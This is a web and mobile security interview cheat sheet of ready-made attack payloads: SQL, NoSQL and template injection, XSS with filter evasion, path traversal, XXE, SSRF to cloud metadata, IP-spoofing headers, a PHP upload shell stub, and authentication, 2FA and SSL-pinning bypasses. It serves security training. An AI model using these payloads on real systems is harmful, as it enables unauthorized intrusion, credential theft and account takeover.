# 📋 Quick Reference Cheat Sheet

> Print this and review before your interview. Key commands and payloads at a glance.

---

## 🔧 Burp Suite Essentials

| Action             | Steps                                                |
| ------------------ | ---------------------------------------------------- |
| Intercept request  | Proxy → Intercept → On → browse → modify → Forward   |
| Send to Repeater   | Right-click request → Send to Repeater (Ctrl+R)      |
| Send to Intruder   | Right-click → Send to Intruder (Ctrl+I)              |
| Brute force        | Intruder → set payloads → mark positions → Start     |
| CSRF + Brute force | Session Handling → Macro → extract token per request |
| Decode             | Decoder tab → paste → Smart Decode                   |
| Sequence analysis  | Sequencer → capture tokens → analyze                 |

---

## 🔑 SQL Injection Quick Payloads

```
' OR '1'='1' --             Login bypass
' UNION SELECT 1,2,3 --     Find columns
' UNION SELECT 1,database(),3 --    Get DB name
' UNION SELECT 1,table_name,3 FROM information_schema.tables --
' OR IF(1=1,SLEEP(5),0) --  Time-based blind
```

**WAF Bypass**: `UNI/**/ON SEL/**/ECT`, `%0aUNION%0aSELECT`, mixed case

---

## 🎯 XSS Quick Payloads

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
```

**WAF Bypass**: Unicode escapes, `atob()`, `top['al'+'ert']`, constructor chains

---

## 📁 Path Traversal Payloads

```
../../../etc/passwd
....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f
..\..\..\windows\win.ini
```

---

## 💉 XXE Template

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

---

## 🌐 SSRF Targets

```
http://127.0.0.1
http://169.254.169.254/latest/meta-data/  (AWS)
http://0x7f000001  (hex bypass)
file:///etc/passwd
```

---

## 📱 NoSQL Injection

```json
{"username":{"$ne":""},"password":{"$ne":""}}
{"username":"admin","password":{"$gt":""}}
username[$ne]=x&password[$ne]=x
```

---

## 🛡️ SSTI Detection

```
{{7*7}}         → 49 = Jinja2/Twig
${7*7}          → 49 = Freemarker
<%= 7*7 %>      → 49 = ERB
#{7*7}          → 49 = Java EL
```

---

## 🔍 Recon Commands

```bash
nmap -sV -sC target            # Service detection
whatweb target                  # Web tech ID
curl -I target                  # Headers
whois target.com                # Domain info
subfinder -d target.com         # Subdomains
```

---

## 📲 Android Testing

```bash
apktool d app.apk                          # Decompile
jadx-gui app.apk                            # Java decompile
objection -g com.app explore                # Hook app
  android sslpinning disable               # Bypass SSL pin
  android root disable                     # Bypass root detect
adb shell am start -n com.app/.Activity     # Launch exported activity
adb shell content query --uri content://... # Query provider
```

---

## 🔐 Hash Identification

| Length        | Type          | Hashcat Mode |
| ------------- | ------------- | ------------ |
| 32 hex        | MD5           | -m 0         |
| 40 hex        | SHA1          | -m 100       |
| 64 hex        | SHA256        | -m 1400      |
| `$2a$` prefix | bcrypt        | -m 3200      |
| `$6$` prefix  | SHA-512 crypt | -m 1800      |

---

## 🏷️ HTTP Headers for IP Bypass

```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
```

---

## 📂 File Upload Bypass

```
.php5 .phtml .phar            Extension alternatives
shell.php.jpg                  Double extension
Content-Type: image/jpeg       Header spoof
GIF89a<?php system(...); ?>    Magic bytes + shell
```

---

## ⚡ Session/Auth Bypass Checklist

1. ☐ Try default credentials
2. ☐ Check for SQLi in login
3. ☐ Modify session cookie (decode → change → re-encode)
4. ☐ Change JWT algorithm to "none"
5. ☐ Skip 2FA page (navigate directly to dashboard URL)
6. ☐ Brute force OTP (if no rate limit)
7. ☐ Response manipulation (false → true)
8. ☐ Check HTML5 storage for tokens/roles
9. ☐ IDOR on user ID parameters

---

## 🧠 Interview Mindset

1. **Read the challenge title carefully** — it tells you the attack vector
2. **Start Burp Suite immediately** — intercept everything
3. **View page source** — look for comments, hidden fields, JS
4. **Check all storage** — cookies, localStorage, sessionStorage
5. **Try the simplest attack first** — don't overcomplicate
6. **Document your steps** — interviewers value methodology
7. **If stuck, enumerate more** — check all endpoints, parameters
8. **Time management** — spend max 20 min per challenge, then move on
